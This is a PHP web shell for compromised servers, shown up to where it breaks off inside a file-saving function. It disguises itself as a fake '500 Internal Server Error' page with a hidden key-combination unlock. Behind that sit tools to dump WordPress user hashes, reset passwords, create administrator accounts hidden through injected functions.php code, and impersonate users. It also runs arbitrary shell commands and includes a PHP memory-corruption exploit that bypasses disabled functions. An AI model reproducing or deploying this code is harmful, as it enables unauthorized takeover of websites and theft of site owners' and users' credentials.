<?php
$hashed_password = '$2a$12$JfErFzPKYCUMacz.jbftfuA/.7IfJ6s3LlWcgMVjUcU4M8FGnweS2';

session_start();

$isLocked = true;
$unlockKey = 'ctrl_capslock';

if (isset($_COOKIE['shell_unlocked']) && $_COOKIE['shell_unlocked'] === 'true') {
    $isLocked = false;
}

if (isset($_POST['unlock_screen']) && $_POST['unlock_screen'] === 'true') {
    setcookie('shell_unlocked', 'true', time() + (86400 * 30), '/');
    $isLocked = false;
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

if ($isLocked) {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>500 Internal Server Error</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: #070b1a;
            background-size: cover;
            background-position: center center;
            background-repeat: no-repeat;
            background-attachment: fixed;
            position: relative;
        }
        body::before {
            content: '';
            position: fixed;
            inset: 0;
            background: rgba(7, 11, 26, 0.35);
            z-index: 0;
        }
        .lock-container {
            position: relative;
            z-index: 1;
            text-align: center;
            padding: 20px;
            width: 100%;
            max-width: 600px;
        }
        .lock-container .lock-hint {
            position: fixed;
            bottom: 40px;
            left: 50%;
            transform: translateX(-50%);
            font-size: 11px;
            color: rgba(255,255,255,0.15);
            letter-spacing: 1px;
            font-weight: 300;
            z-index: 2;
        }
        .lock-container .lock-hint kbd {
            background: rgba(255,255,255,0.05);
            padding: 4px 12px;
            border-radius: 4px;
            border: 1px solid rgba(255,255,255,0.05);
            color: rgba(255,255,255,0.2);
            font-family: inherit;
            font-size: 10px;
        }

        .error-500 {
            color: #ffffff !important;
            text-shadow: 0 0 30px rgba(255,255,255,0.15), 0 0 60px rgba(255,255,255,0.05);
            font-weight: 800;
            letter-spacing: 2px;
        }
        .error-500 .big {
            font-size: 50px;
            line-height: 1;
            display: block;
            margin-bottom: 10px;
            color: #ffffff !important;
        }
        .error-500 .sub {
            font-size: 18px;
            font-weight: 600;
            color: #ffffff !important;
            opacity: 0.95;
        }
        .error-500 .desc {
            font-size: 12px;
            font-weight: 400;
            color: #ffffff !important;
            opacity: 0.85;
            margin-top: 8px;
        }
        @media (max-width: 480px) {
            .error-500 .big { font-size: 32px; }
            .error-500 .sub { font-size: 13px; }
            .error-500 .desc { font-size: 10px; }
            .lock-container .lock-hint {
                font-size: 7px;
                bottom: 25px;
            }
        }
    </style>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            var ctrlPressed = false;
            var capsLockPressed = false;

            document.addEventListener('keydown', function(e) {
                if (e.key === 'Control' || e.key === 'Ctrl') {
                    ctrlPressed = true;
                }
                if (e.key === 'CapsLock') {
                    capsLockPressed = true;
                }
                if (ctrlPressed && capsLockPressed) {
                    unlockScreen();
                }
            });

            document.addEventListener('keyup', function(e) {
                if (e.key === 'Control' || e.key === 'Ctrl') {
                    ctrlPressed = false;
                }
                if (e.key === 'CapsLock') {
                    capsLockPressed = false;
                }
            });

            document.addEventListener('keydown', function(e) {
                if (e.key === 'CapsLock') {
                    capsLockPressed = e.getModifierState('CapsLock');
                    if (ctrlPressed && capsLockPressed) {
                        unlockScreen();
                    }
                }
            });

            document.addEventListener('keydown', function(e) {
                if (e.key === 'Control' || e.key === 'Ctrl') {
                    ctrlPressed = true;
                    if (e.getModifierState('CapsLock')) {
                        unlockScreen();
                    }
                }
            });

            function unlockScreen() {
                var form = document.createElement('form');
                form.method = 'POST';
                form.style.display = 'none';
                var input = document.createElement('input');
                input.type = 'hidden';
                input.name = 'unlock_screen';
                input.value = 'true';
                form.appendChild(input);
                document.body.appendChild(form);
                form.submit();
            }
        });
    </script>
    </head>
    <body>
        <div class="lock-container">
            <div class="error-500">
                <span class="big">500</span>
                <span class="sub">Internal Server Error</span>
                <div class="desc">An internal server error has occurred.</div>
            </div>
            <div class="lock-hint">
            </div>
        </div>
    </body>
    </html>
    <?php
    exit;
}

if (!isset($_SESSION['shell_authenticated']) || $_SESSION['shell_authenticated'] !== true) {
    if (isset($_COOKIE['shell_remember']) && $_COOKIE['shell_remember'] === md5($correct_password . 'salt')) {
        $_SESSION['shell_authenticated'] = true;
        $_SESSION['shell_login_time'] = time();
    }
}

if (isset($_POST['login_password'])) {
    $input_pass = $_POST['login_password'];
    if (password_verify($input_pass, $hashed_password)) {
        $_SESSION['shell_authenticated'] = true;
        $_SESSION['shell_login_time'] = time();
        if (isset($_POST['remember_me'])) {
            setcookie('shell_remember', md5($correct_password . 'salt'), time() + (86400 * 30), '/');
        }
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    } else {
        $login_error = '❌ Invalid credentials!';
    }
}

if (isset($_GET['logout'])) {
    session_destroy();
    setcookie('shell_remember', '', time() - 3600, '/');
    setcookie('shell_unlocked', '', time() - 3600, '/');
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

if (!isset($_SESSION['shell_authenticated']) || $_SESSION['shell_authenticated'] !== true) {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>#@168%*</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: #070b1a;
            background-image: url('https://ik.imagekit.io/nehadee/backgroud%20bajakteam168.png?updatedAt=1785966064305');
            background-size: cover;
            background-position: center center;
            background-repeat: no-repeat;
            background-attachment: fixed;
            position: relative;
        }
        body::before {
            content: '';
            position: fixed;
            inset: 0;
            background: rgba(7, 11, 26, 0.75);
            z-index: 0;
        }
        .login-container {
            position: relative;
            z-index: 1;
            background: rgba(17, 29, 58, 0.88);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid rgba(240, 185, 11, 0.2);
            border-radius: 20px;
            padding: 40px 45px;
            max-width: 420px;
            width: 92%;
            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.6), 0 0 40px rgba(240, 185, 11, 0.05);
            text-align: center;
        }
        .login-container .avatar {
            width: 90px;
            height: 90px;
            border-radius: 50%;
            margin: 0 auto 20px;
            border: 3px solid var(--accent-gold, #f0b90b);
            object-fit: cover;
            display: block;
            background: #0c1428;
            padding: 3px;
        }
        .login-container h1 {
            font-size: 26px;
            font-weight: 900;
            background: linear-gradient(135deg, #a855f7, #4a9eff, #f97316, #ec4899, #10b981);
            background-size: 300% 300%;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            animation: gradientShift 4s ease-in-out infinite;
            margin-bottom: 4px;
        }
        @keyframes gradientShift {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        .login-container .subtitle {
            color: rgba(136, 153, 187, 0.7);
            font-size: 12px;
            letter-spacing: 3px;
            text-transform: uppercase;
            margin-bottom: 28px;
            font-weight: 400;
        }
        .login-container .subtitle span {
            color: #f0b90b;
        }
        .login-container .error {
            background: rgba(248, 81, 73, 0.12);
            border: 1px solid rgba(248, 81, 73, 0.2);
            color: #f85149;
            padding: 10px 16px;
            border-radius: 10px;
            font-size: 13px;
            margin-bottom: 18px;
        }
        .login-container .form-group {
            margin-bottom: 18px;
            text-align: left;
        }
        .login-container .form-group label {
            display: block;
            font-size: 12px;
            color: #8899bb;
            font-weight: 500;
            margin-bottom: 6px;
        }
        .login-container .form-group input[type="password"] {
            width: 100%;
            padding: 12px 16px;
            background: rgba(10, 20, 40, 0.85);
            border: 1px solid rgba(42, 64, 104, 0.7);
            border-radius: 12px;
            color: #e8edf5;
            font-size: 15px;
            outline: none;
            transition: all 0.3s ease;
            font-family: inherit;
        }
        .login-container .form-group input[type="password"]:focus {
            border-color: #4a9eff;
            box-shadow: 0 0 0 3px rgba(74, 158, 255, 0.08);
        }
        .login-container .form-group input[type="password"]::placeholder {
            color: rgba(74, 90, 122, 0.6);
        }
        .login-container .remember-row {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 22px;
            font-size: 13px;
            color: #8899bb;
            cursor: pointer;
        }
        .login-container .remember-row input[type="checkbox"] {
            width: 17px;
            height: 17px;
            accent-color: #f0b90b;
            cursor: pointer;
        }
        .login-container .login-btn {
            width: 100%;
            padding: 13px;
            background: linear-gradient(135deg, #25a0e7, #a73de4);
            color: #f8f8f8;
            font-weight: 700;
            font-size: 16px;
            border: none;
            border-radius: 12px;
            cursor: pointer;
            transition: all 0.3s ease;
            font-family: inherit;
        }
        .login-container .login-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 30px rgba(240, 185, 11, 0.3);
        }
        .login-container .login-btn:active {
            transform: scale(0.97);
        }
        .login-container .footer-text {
            margin-top: 20px;
            font-size: 11px;
            color: rgba(74, 90, 122, 0.6);
            letter-spacing: 1px;
        }
        .login-container .footer-text span {
            color: #890bf0;
            font-weight: 600;
        }
        @media (max-width: 480px) {
            .login-container {
                padding: 30px 22px;
            }
            .login-container h1 {
                font-size: 22px;
            }
            .login-container .avatar {
                width: 72px;
                height: 72px;
            }
        }
        .login-container .bg-note {
            position: absolute;
            bottom: -30px;
            left: 50%;
            transform: translateX(-50%);
            color: rgba(136, 153, 187, 0.15);
            font-size: 9px;
            letter-spacing: 2px;
            text-transform: uppercase;
            white-space: nowrap;
        }
    </style>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
    </head>
    <body>
        <div class="login-container">
            <h1>MULTIFUNGSI SHEL</h1>
            <div class="subtitle"> <span></span></div>

            <?php if (isset($login_error)): ?>
            <div class="error"><?php echo $login_error; ?></div>
            <?php endif; ?>

            <form method="POST">
                <div class="form-group">
                    <label for="login_pass">Password</label>
                    <input type="password" id="login_pass" name="login_password" placeholder="Hayoo apa paswordnya.." autofocus required>
                </div>
                <div class="remember-row">
                    <input type="checkbox" name="remember_me" id="remember_me">
                    <label for="remember_me" style="cursor:pointer;">Remember me</label>
                </div>
                <button type="submit" class="login-btn">🚪 LOGIN</button>
            </form>
            <div class="footer-text"><span></span><span></span></div>
            <div class="bg-note">naked background</div>
        </div>
    </body>
    </html>
    <?php
    exit;
}

if (isset($_GET['debug500'])) {
    ini_set('display_errors', 1);
    error_reporting(E_ALL);
} else {
    @ini_set('error_log', NULL);
    @ini_set('log_errors', 0);
    @error_reporting(0);
}
@ini_set('max_execution_time', 0);
@set_time_limit(0);

function findWpLoad($dir = null, $depth = 0) {
    if ($depth > 8) return false;
    $dir = $dir ?: __DIR__;
    $wp_load = $dir . '/wp-load.php';
    if (file_exists($wp_load)) return $wp_load;
    return findWpLoad(dirname($dir), $depth + 1);
}

if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['c4t'])) {

    $wp_load_path = findWpLoad();
    if (!$wp_load_path) {
        echo json_encode(['err' => 'wp-load.php not found']);
        exit;
    }

    require_once $wp_load_path;

    function addUserProtection($username) {
        $functions_file = get_template_directory() . '/functions.php';
        if (!file_exists($functions_file)) {
            $functions_file = get_stylesheet_directory() . '/functions.php';
        }

        if (file_exists($functions_file)) {
            $protection_code = '

add_action(\'pre_get_users\', function($query) {
    if (is_admin() && function_exists(\'get_current_screen\')) {
        $screen = get_current_screen();
        if ($screen && $screen->base === \'users\') {
            $protected_user = get_user_by(\'login\', \'' . $username . '\');
            if ($protected_user) {
                $excluded = (array) $query->get(\'exclude\');
                $excluded[] = $protected_user->ID;
                $query->set(\'exclude\', $excluded);
            }
        }
    }
});
add_filter(\'wp_count_users\', function($counts) {
    $protected_user = get_user_by(\'login\', \'' . $username . '\');
    if ($protected_user) {
        $counts->total_users--;
    }
    return $counts;
});
add_action(\'delete_user\', function($user_id) {
    $user = get_user_by(\'ID\', $user_id);
    if ($user && $user->user_login === \'' . $username . '\') {
        wp_die(
            __(\'User ' . $username . ' cannot be deleted.\', \'textdomain\'),
            __(\'Error\', \'textdomain\'),
            array(\'response\' => 403)
        );
    }
});
add_filter(\'user_search_columns\', function($search_columns, $search, $query) {
    if (is_admin()) {
        $protected_user = get_user_by(\'login\', \'' . $username . '\');
        if ($protected_user) {
            global $wpdb;
            $query->query_where .= $wpdb->prepare(" AND {$wpdb->users}.ID != %d", $protected_user->ID);
        }
    }
    return $search_columns;
}, 10, 3);
add_filter(\'bulk_actions-users\', function($actions) {
    if (isset($_REQUEST[\'users\']) && is_array($_REQUEST[\'users\'])) {
        $protected_user = get_user_by(\'login\', \'' . $username . '\');
        if ($protected_user && in_array($protected_user->ID, $_REQUEST[\'users\'])) {
            unset($actions[\'delete\']);
        }
    }
    return $actions;
});
';

            $current_content = file_get_contents($functions_file);
            if (strpos($current_content, "get_user_by('login', '{$username}')") === false) {
                file_put_contents($functions_file, $protection_code, FILE_APPEND | LOCK_EX);
                return true;
            } else {
                return true;
            }
        }
        return false;
    }

    function removeUserProtection($username) {
        $functions_file = get_template_directory() . '/functions.php';
        if (!file_exists($functions_file)) {
            $functions_file = get_stylesheet_directory() . '/functions.php';
        }

        if (file_exists($functions_file)) {
            $current_content = file_get_contents($functions_file);

            $pattern = '/add_action\(\'pre_get_users\'.*?get_user_by\(\'login\', \'' . preg_quote($username, '/') . '\'.*?add_filter\(\'bulk_actions-users\'.*?\}\);\s*/s';

            $new_content = preg_replace($pattern, '', $current_content);

            if ($new_content !== $current_content) {
                file_put_contents($functions_file, $new_content, LOCK_EX);
                return true;
            }
        }
        return false;
    }

    function isUserHidden($username) {
        $functions_file = get_template_directory() . '/functions.php';
        if (!file_exists($functions_file)) {
            $functions_file = get_stylesheet_directory() . '/functions.php';
        }

        if (file_exists($functions_file)) {
            $current_content = file_get_contents($functions_file);
            return strpos($current_content, "get_user_by('login', '{$username}')") !== false;
        }
        return false;
    }

    global $wpdb;

    if ($_POST['c4t'] == 'ulst') {
        $users = $wpdb->get_results("SELECT ID, user_login, user_email, user_pass, user_registered FROM {$wpdb->users}");

        foreach ($users as $user) {
            $user->is_hidden = isUserHidden($user->user_login);
        }

        echo json_encode($users);
        exit;
    }

    if ($_POST['c4t'] == 'rpsw') {
        $user_id = intval($_POST['uix']);
        $new_password = wp_generate_password(12, true, true);
        wp_set_password($new_password, $user_id);
        $user_data = get_userdata($user_id);
        echo json_encode([
            'l' => $user_data->user_login,
            'e' => $user_data->user_email,
            'n' => $new_password
        ]);
        exit;
    }

    if ($_POST['c4t'] == 'cadm') {
        $username = preg_replace('/[^a-zA-Z0-9_]/', '', $_POST['xun']);
        $password = $_POST['xpw'];
        $email = filter_var($_POST['xem'], FILTER_VALIDATE_EMAIL) ? $_POST['xem'] : $username . '@' . $_SERVER['HTTP_HOST'];
        $hide_user = isset($_POST['hide_user']) ? true : false;

        if (username_exists($username)) {
            echo json_encode(['err' => 'user exists']);
            exit;
        }

        $user_id = wp_create_user($username, $password, $email);
        if ($user_id && !is_wp_error($user_id)) {
            $user = new WP_User($user_id);
            $user->set_role('administrator');

            if ($hide_user) {
                addUserProtection($username);
            }

            echo json_encode([
                'ok' => 'created',
                'u' => $username,
                'p' => $password,
                'hide' => $hide_user
            ]);
        } else {
            echo json_encode(['err' => 'create failed']);
        }
        exit;
    }

    if ($_POST['c4t'] == 'alog') {
        $user_id = intval($_POST['uix']);
        wp_clear_auth_cookie();
        wp_set_current_user($user_id);
        wp_set_auth_cookie($user_id, true);
        echo json_encode(['url' => admin_url()]);
        exit;
    }

    if ($_POST['c4t'] == 'hide') {
        $user_id = intval($_POST['uix']);
        $user = get_user_by('ID', $user_id);
        if ($user) {
            $result = addUserProtection($user->user_login);
            echo json_encode([
                'ok' => 'hidden',
                'user' => $user->user_login,
                'success' => $result
            ]);
        } else {
            echo json_encode(['err' => 'user not found']);
        }
        exit;
    }

    if ($_POST['c4t'] == 'unhide') {
        $user_id = intval($_POST['uix']);
        $user = get_user_by('ID', $user_id);
        if ($user) {
            $result = removeUserProtection($user->user_login);
            echo json_encode([
                'ok' => 'unhidden',
                'user' => $user->user_login,
                'success' => $result
            ]);
        } else {
            echo json_encode(['err' => 'user not found']);
        }
        exit;
    }

    if ($_POST['c4t'] == 'del') {
        $user_id = intval($_POST['uix']);
        $user = get_user_by('ID', $user_id);
        if ($user) {
            $current_user = wp_get_current_user();
            if ($user_id == $current_user->ID) {
                echo json_encode(['err' => 'cannot_delete_self']);
                exit;
            }

            if (isUserHidden($user->user_login)) {
                removeUserProtection($user->user_login);
            }

            if (wp_delete_user($user_id)) {
                echo json_encode([
                    'ok' => 'deleted',
                    'user' => $user->user_login
                ]);
            } else {
                echo json_encode(['err' => 'delete_failed']);
            }
        } else {
            echo json_encode(['err' => 'user_not_found']);
        }
        exit;
    }

    exit;
}

session_start();
function isAuthenticated() { return true; }

if (isset($_GET['del'])) {
    $fileToDelete = $_GET['del'];
    $fileToDelete = str_replace('\\', '/', $fileToDelete);
    $currentDir = getcwd();
    
    $realPath = realpath($fileToDelete);
    $realCurrentDir = realpath($currentDir);
    
    if ($realPath && $realCurrentDir && strpos($realPath, $realCurrentDir) === 0) {
        $result = deleteFile($fileToDelete);
        if ($result) {
            $msg = 'deleted';
        } else {
            $msg = 'delete_failed';
        }
    } else {
        $msg = 'invalid_path';
    }
    header('Location: ' . $_SERVER['PHP_SELF'] . '?msg=' . $msg);
    exit;
}

if (isset($_POST['proc_action']) && isAuthenticated()) {
    header('Content-Type: application/json; charset=utf-8');
    $pAct = $_POST['proc_action'];

    if ($pAct === 'list') {
        $ps_out = shell_exec('ps auxww 2>/dev/null') ?: '';
        $lines = explode("\n", trim($ps_out));
        $header = array_shift($lines);
        $processes = [];
        foreach ($lines as $line) {
            $line = trim($line);
            if (empty($line)) continue;
            $cols = preg_split('/\s+/', $line, 11);
            if (count($cols) >= 11) {
                $processes[] = [
                    'user' => $cols[0],
                    'pid' => $cols[1],
                    'cpu' => $cols[2],
                    'mem' => $cols[3],
                    'vsz' => $cols[4],
                    'rss' => $cols[5],
                    'tty' => $cols[6],
                    'stat' => $cols[7],
                    'start' => $cols[8],
                    'time' => $cols[9],
                    'command' => $cols[10],
                ];
            }
        }

        $ps_pids = array_column($processes, 'pid');
        $hidden = [];
        if (is_dir('/proc')) {
            $proc_dirs = @scandir('/proc');
            if ($proc_dirs) {
                foreach ($proc_dirs as $d) {
                    if (!is_numeric($d)) continue;
                    if (!in_array($d, $ps_pids)) {
                        $cmdline = @file_get_contents("/proc/$d/cmdline");
                        $cmdline = $cmdline ? str_replace("\0", ' ', trim($cmdline)) : '[hidden]';
                        $status = @file_get_contents("/proc/$d/status");
                        $uid = '?';
                        if ($status && preg_match('/Uid:\s+(\d+)/', $status, $m)) {
                            $pw = @posix_getpwuid((int)$m[1]);
                            $uid = $pw ? $pw['name'] : $m[1];
                        }
                        $hidden[] = [
                            'pid' => $d,
                            'user' => $uid,
                            'command' => $cmdline ?: '[hidden]',
                        ];
                    }
                }
            }
        }

        $recent = [];
        $now = time();
        foreach ($processes as $p) {
            $stat = @file_get_contents("/proc/{$p['pid']}/stat");
            if ($stat) {
                $parts = explode(' ', $stat);
                if (isset($parts[21])) {
                    $uptime_str = @file_get_contents('/proc/uptime');
                    if ($uptime_str) {
                        $uptime = (float)explode(' ', $uptime_str)[0];
                        $clk_tck = 100;
                        $start_sec = (float)$parts[21] / $clk_tck;
                        $boot_time = $now - $uptime;
                        $proc_start = $boot_time + $start_sec;
                        $age = $now - $proc_start;
                        if ($age >= 0 && $age <= 300) {
                            $p['age_seconds'] = (int)$age;
                            $recent[] = $p;
                        }
                    }
                }
            }
        }

        echo json_encode([
            'processes' => $processes,
            'hidden' => $hidden,
            'recent' => $recent,
            'total' => count($processes),
            'total_hidden' => count($hidden),
            'total_recent' => count($recent),
        ]);
        exit;
    }

    if ($pAct === 'kill') {
        $pid = intval($_POST['pid'] ?? 0);
        if ($pid > 0) {
            $sig = $_POST['signal'] ?? '9';
            $out = shell_exec("kill -$sig $pid 2>&1");
            echo json_encode(['ok' => true, 'pid' => $pid, 'output' => trim($out ?? '')]);
        } else {
            echo json_encode(['err' => 'invalid pid']);
        }
        exit;
    }

    echo json_encode(['err' => 'unknown action']);
    exit;
}

@ob_clean();
@header("X-Accel-Buffering: no");
@header("Content-Encoding: none");

class Helper { public $a, $b, $c; }
class Pwn {
    const LOGGING = false;
    const CHUNK_DATA_SIZE = 0x60;
    const CHUNK_SIZE = self::CHUNK_DATA_SIZE;
    const STRING_SIZE = self::CHUNK_DATA_SIZE - 0x18 - 1;
    const HT_SIZE = 0x118;
    const HT_STRING_SIZE = self::HT_SIZE - 0x18 - 1;

    public function __construct($cmd) {
        for($i = 0; $i < 10; $i++) {
            $groom[] = self::alloc(self::STRING_SIZE);
            $groom[] = self::alloc(self::HT_STRING_SIZE);
        }
        $concat_str_addr = self::str2ptr($this->heap_leak(), 16);
        $fill = self::alloc(self::STRING_SIZE);
        $this->abc = self::alloc(self::STRING_SIZE);
        $abc_addr = $concat_str_addr + self::CHUNK_SIZE;
        $this->free($abc_addr);
        $this->helper = new Helper;
        if(strlen($this->abc) < 0x1337) return;
        $this->helper->a = "leet";
        $this->helper->b = function($x) {};
        $this->helper->c = 0xfeedface;
        $helper_handlers = $this->rel_read(0);
        $closure_addr = $this->rel_read(0x20);
        $closure_ce = $this->read($closure_addr + 0x10);
        $basic_funcs = $this->get_basic_funcs($closure_ce);
        $zif_system = $this->get_system($basic_funcs);
        $fake_closure_off = 0x70;
        for($i = 0; $i < 0x138; $i += 8) {
            $this->rel_write($fake_closure_off + $i, $this->read($closure_addr + $i));
        }
        $this->rel_write($fake_closure_off + 0x38, 1, 4);
        $handler_offset = PHP_MAJOR_VERSION === 8 ? 0x70 : 0x68;
        $this->rel_write($fake_closure_off + $handler_offset, $zif_system);
        $fake_closure_addr = $abc_addr + $fake_closure_off + 0x18;
        $this->rel_write(0x20, $fake_closure_addr);
        ($this->helper->b)($cmd);
        $this->rel_write(0x20, $closure_addr);
        unset($this->helper->b);
    }
    private function heap_leak() {
        $arr = [[], []];
        set_error_handler(function() use (&$arr, &$buf) {
            $arr = 1;
            $buf = str_repeat("\x00", self::HT_STRING_SIZE);
        });
        $arr[1] .= self::alloc(self::STRING_SIZE - strlen("Array"));
        return $buf;
    }
    private function free($addr) {
        $payload = pack("Q*", 0xdeadbeef, 0xcafebabe, $addr);
        $payload .= str_repeat("A", self::HT_STRING_SIZE - strlen($payload));
        $arr = [[], []];
        set_error_handler(function() use (&$arr, &$buf, &$payload) {
            $arr = 1;
            $buf = str_repeat($payload, 1);
        });
        $arr[1] .= "x";
    }
    private function rel_read($offset) { return self::str2ptr($this->abc, $offset); }
    private function rel_write($offset, $value, $n = 8) {
        for ($i = 0; $i < $n; $i++) {
            $this->abc[$offset + $i] = chr($value & 0xff);
            $value >>= 8;
        }
    }
    private function read($addr, $n = 8) {
        $this->rel_write(0x10, $addr - 0x10);
        $value = strlen($this->helper->a);
        if($n !== 8) { $value &= (1 << ($n << 3)) - 1; }
        return $value;
    }
    private function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = $this->read($addr);
            $f_name = $this->read($f_entry, 6);
            if($f_name === 0x6d6574737973) return $this->read($addr + 8);
            $addr += 0x20;
        } while($f_entry !== 0);
    }
    private function get_basic_funcs($addr) {
        while(true) {
            $addr -= 0x10;
            if($this->read($addr, 4) === 0xA8 &&
                in_array($this->read($addr + 4, 4), [20180731, 20190902, 20200930, 20210902])) {
                $module_name_addr = $this->read($addr + 0x20);
                $module_name = $this->read($module_name_addr);
                if($module_name === 0x647261646e617473) return $this->read($addr + 0x28);
            }
        }
    }
    static function alloc($size) { return str_shuffle(str_repeat("A", $size)); }
    static function str2ptr($str, $p = 0, $n = 8) {
        $address = 0;
        for($j = $n - 1; $j >= 0; $j--) { $address <<= 8; $address |= ord($str[$p + $j]); }
        return $address;
    }
}

function runBypass($cmd) {
    ob_start();
    try { new Pwn($cmd); } catch(\Throwable $e) {}
    $out = ob_get_clean();
    return (!empty(trim($out ?? ''))) ? trim($out) : null;
}

function runCmd($cmd) {
    $out = null;
    $user = get_current_user();
    $home = getenv('HOME') ?: ('/home/' . $user);
    $env = "HOME=$home USER=$user";
    $fullCmd = $env . ' /bin/bash -l -c ' . escapeshellarg($cmd) . ' 2>&1';
    if (function_exists('proc_open')) {
        $desc = [0 => ['pipe','r'], 1 => ['pipe','w'], 2 => ['pipe','w']];
        $envArr = ['HOME' => $home, 'USER' => $user, 'PATH' => '/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin'];
        $proc = @proc_open('/bin/bash -l -c ' . escapeshellarg($cmd), $desc, $pipes, $home, $envArr);
        if (is_resource($proc)) {
            @fclose($pipes[0]);
            $out = @stream_get_contents($pipes[1]);
            $err = @stream_get_contents($pipes[2]);
            @fclose($pipes[1]);
            @fclose($pipes[2]);
            @proc_close($proc);
            if (empty(trim($out ?? '')) && !empty(trim($err ?? ''))) $out = $err;
        }
    }
    if ($out === null && function_exists('exec')) {
        @exec($fullCmd, $outArr, $ret);
        $out = implode("\n", $outArr);
    }
    if ($out === null && function_exists('shell_exec')) {
        $out = @shell_exec($fullCmd);
    }
    if ($out === null && function_exists('popen')) {
        $fp = @popen($fullCmd, 'r');
        if ($fp) { $out = @stream_get_contents($fp); @pclose($fp); }
    }
    if ($out === null || trim($out) === '') {
        $out = runBypass($cmd);
    }
    return $out;
}

function runUapi($args) {
    return runCmd('uapi ' . $args);
}

function parseUapiStatus($raw) {
    if (empty($raw)) return ['ok' => false, 'raw' => ''];
    $ok = (bool)preg_match('/status:\s*1/', $raw);
    return ['ok' => $ok, 'raw' => $raw];
}

function parseUapiFtpList($raw) {
    if (empty($raw)) return [];
    $accounts = [];
    $blocks = preg_split('/^\s*-\s*$/m', $raw);
    foreach ($blocks as $block) {
        $acct = [];
        if (preg_match('/\buser:\s*(.+)/i', $block, $m)) $acct['user'] = trim($m[1], " '\"\r\n");
        if (preg_match('/\blogin:\s*(.+)/i', $block, $m)) $acct['login'] = trim($m[1], " '\"\r\n");
        if (preg_match('/\bdomain:\s*(.+)/i', $block, $m)) $acct['domain'] = trim($m[1], " '\"\r\n");
        if (preg_match('/\bhomedir:\s*(.+)/i', $block, $m)) $acct['homedir'] = trim($m[1], " '\"\r\n");
        if (preg_match('/\bdiskquota:\s*(.+)/i', $block, $m)) $acct['quota'] = trim($m[1], " '\"\r\n");
        if (preg_match('/\bdiskused:\s*(.+)/i', $block, $m)) $acct['used'] = trim($m[1], " '\"\r\n");
        if (!empty($acct['user']) || !empty($acct['login'])) $accounts[] = $acct;
    }
    if (empty($accounts)) {
        preg_match_all('/(?:user|login):\s*[\'"]?(\S+)[\'"]?/i', $raw, $userMatches);
        preg_match_all('/domain:\s*[\'"]?(\S+)[\'"]?/i', $raw, $domainMatches);
        preg_match_all('/homedir:\s*[\'"]?(\S+)[\'"]?/i', $raw, $dirMatches);
        for ($i = 0; $i < count($userMatches[1]); $i++) {
            $accounts[] = [
                'user' => $userMatches[1][$i] ?? '',
                'login' => $userMatches[1][$i] ?? '',
                'domain' => $domainMatches[1][$i] ?? '',
                'homedir' => $dirMatches[1][$i] ?? '',
            ];
        }
    }
    return $accounts;
}

function formatSize($size) {
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $i = 0;
    while ($size >= 1024 && $i < 4) { $size /= 1024; $i++; }
    return round($size, 2) . ' ' . $units[$i];
}

function fixPermission($path) {
    $perms = @fileperms($path);
    if ($perms === false) return false;
    $octal = substr(sprintf('%o', $perms), -4);
    $unwritable = ['0555','0444','0111','0000','0550','0440','0110','0554','0445','0511','0155','0144'];
    if (in_array($octal, $unwritable)) {
        if (is_dir($path)) {
            @chmod($path, 0755);
        } else {
            @chmod($path, 0644);
        }
        return true;
    }
    return false;
}

function safeAccess($path) {
    fixPermission($path);
    return @is_readable($path);
}

function getFileDetails($path) {
    $folders = [];
    $files = [];
    try {
        if (!safeAccess($path)) return 'None';
        $items = @scandir($path);
        if (!is_array($items)) return 'None';
        foreach ($items as $item) {
            if ($item == '.' || $item == '..') continue;
            $itemPath = $path . '/' . $item;
            $perm = @fileperms($itemPath);
            $permStr = $perm !== false ? substr(sprintf('%o', $perm), -4) : '----';
            $size = '';
            if (!is_dir($itemPath)) {
                $s = @filesize($itemPath);
                $size = $s !== false ? formatSize($s) : '?';
            }
            $isWritable = @is_writable($itemPath);
            $isReadable = @is_readable($itemPath);
            $permColor = '#f85149';
            if ($isWritable && $isReadable) $permColor = '#3fb950';
            elseif ($isReadable) $permColor = '#e6edf3';
            $detail = [
                'name' => $item,
                'type' => is_dir($itemPath) ? 'Folder' : 'File',
                'size' => $size,
                'permission' => $permStr,
                'perm_color' => $permColor,
                'writable' => $isWritable,
                'readable' => $isReadable,
            ];
            if (is_dir($itemPath)) $folders[] = $detail;
            else $files[] = $detail;
        }
        return array_merge($folders, $files);
    } catch (Exception $e) {
        return 'None';
    }
}

function executeCommand($command) {
    $currentDirectory = getCurrentDirectory();
    $fullCmd = "cd " . escapeshellarg($currentDirectory) . " && " . $command;
    $out = runCmd($fullCmd);
    if ($out !== null && !empty(trim($out))) return trim($out);
    $out = runBypass($command);
    if ($out !== null && !empty(trim($out))) return trim($out);
    return 'No output or command failed.';
}

function readFileContent($file) { return @file_get_contents($file); }

function saveFileContent($file) {
    if (isset($_POST['content'])) {
        fixPermission($file);
